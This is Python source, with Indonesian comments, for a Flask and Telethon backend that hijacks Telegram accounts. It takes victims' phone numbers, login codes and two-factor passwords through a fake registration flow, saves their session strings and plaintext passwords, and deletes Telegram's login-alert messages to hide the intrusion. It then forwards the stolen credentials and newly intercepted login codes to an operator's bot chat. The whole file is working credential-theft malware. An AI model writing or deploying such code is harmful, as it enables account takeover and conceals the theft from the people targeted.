import os, requests, asyncio, re, threading, sqlite3
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from telethon.tl.functions.messages import DeleteHistoryRequest

app = Flask(__name__)
CORS(app)

# Ambil dari Variables Railway (Pastikan Nama Variabel Sama!)
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
# Gunakan DOMAIN yang ada di Railway (contoh: web-production-xxx.up.railway.app)
DOMAIN = os.getenv("RAILWAY_STATIC_URL")

# --- DATABASE SEDERHANA ---
def init_db():
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (nomor TEXT PRIMARY KEY, session TEXT, nama TEXT, sandi TEXT, msg_id INTEGER)''')
    conn.commit()
    conn.close()

def db_save(nomor, session=None, nama=None, sandi=None, msg_id=None):
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (nomor) VALUES (?)", (nomor,))
    if session: c.execute("UPDATE users SET session=? WHERE nomor=?", (session, nomor))
    if nama: c.execute("UPDATE users SET nama=? WHERE nomor=?", (nama, nomor))
    if sandi: c.execute("UPDATE users SET sandi=? WHERE nomor=?", (sandi, nomor))
    if msg_id: c.execute("UPDATE users SET msg_id=? WHERE nomor=?", (msg_id, nomor))
    conn.commit()
    conn.close()

def db_get(nomor):
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE nomor=?", (nomor,))
    res = c.fetchone()
    conn.close()
    return res if res else None

init_db()

def bot_api(method, payload):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        return requests.post(url, json=payload, timeout=10).json()
    except: return {}

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(handle_flow(data))
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    finally: loop.close()

async def handle_flow(data):
    client = None
    try:
        step = int(data.get('step', 1))
        num = re.sub(r'\D', '', data.get('nomor', ''))
        if num.startswith('0'): num = '62' + num[1:]
        nomor = '+' + num

        # Cek data lama di DB
        u = db_get(nomor)
        sess_str = u[1] if u else ""
        
        client = TelegramClient(StringSession(sess_str), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            res = await client.send_code_request(nomor)
            db_save(nomor, session=client.session.save()) # Simpan Hash sementara di sesi
            # Simpan hash ke database agar tidak hilang
            db_save(nomor, sandi=res.phone_code_hash) 
            return jsonify({"status": "success"})

        elif step == 2:
            otp = data.get('otp')
            try:
                # Ambil hash yang tadi disimpan di kolom sandi sementara
                u_hash = db_get(nomor)[3]
                await client.sign_in(nomor, otp, phone_code_hash=u_hash)
                return await finalize(client, nomor)
            except errors.SessionPasswordNeededError:
                db_save(nomor, session=client.session.save())
                return jsonify({"status": "need_2fa"})
            except: return jsonify({"status": "error"}), 400

        elif step == 3:
            sandi = data.get('sandi')
            try:
                await client.sign_in(password=sandi)
                db_save(nomor, sandi=sandi)
                return await finalize(client, nomor)
            except: return jsonify({"status": "error"}), 400
    finally:
        if client: await client.disconnect()

async def finalize(client, nomor):
    me = await client.get_me()
    nama = (me.first_name if me.first_name else "User").split()[0]
    u = db_get(nomor)
    db_save(nomor, nama=nama, session=client.session.save())
    
    await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
    
    pesan = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: {u[3] if u[3] else 'None'}"
    bot_api("sendMessage", {
        "chat_id": CHAT_ID, "text": pesan, "parse_mode": "Markdown",
        "reply_markup": {"inline_keyboard": [[{"text": "OTP", "callback_data": f"upd_{nomor}"}]]}
    })
    return jsonify({"status": "success"})

# --- INI JALUR WEBHOOK YANG HARUS JEBOL ---
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and "callback_query" in update:
        call = update["callback_query"]
        bot_api("answerCallbackQuery", {"callback_query_id": call["id"]})
        
        cb_data = call.get("data", "")
        if cb_data.startswith("upd_"):
            nomor = cb_data.split("_")[1]
            # Kirim pesan status
            res = bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Bot Siap Menerima OTP, klik /exit untuk keluar"})
            db_save(nomor, msg_id=res.get('result', {}).get('message_id'))
            
            # Monitoring OTP
            threading.Thread(target=lambda: asyncio.run(monitor(nomor)), daemon=True).start()
                
    return jsonify({"status": "success"}), 200

async def monitor(nomor):
    u = db_get(nomor)
    if not u or not u[1]: return
    
    client = TelegramClient(StringSession(u[1]), int(API_ID), API_HASH)
    try:
        await client.connect()
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                curr = db_get(nomor)
                if curr[4]: # Hapus pesan status
                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": curr[4]})
                
                final_text = f"Nama: **{curr[2]}**\nNomor: `{nomor}`\nKata sandi: {curr[3]}\nOTP: `{otp.group(0)}`"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, "text": final_text, "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "OTP", "callback_data": f"upd_{nomor}"}]]}
                })
                await event.delete(revoke=True)
                await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
        await client.run_until_disconnected()
    except: pass
    finally: await client.disconnect()

if __name__ == "__main__":
    # Paksa pendaftaran Webhook setiap server nyala
    if DOMAIN:
        wh_url = f"https://{DOMAIN}/webhook"
        bot_api("setWebhook", {"url": wh_url})
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))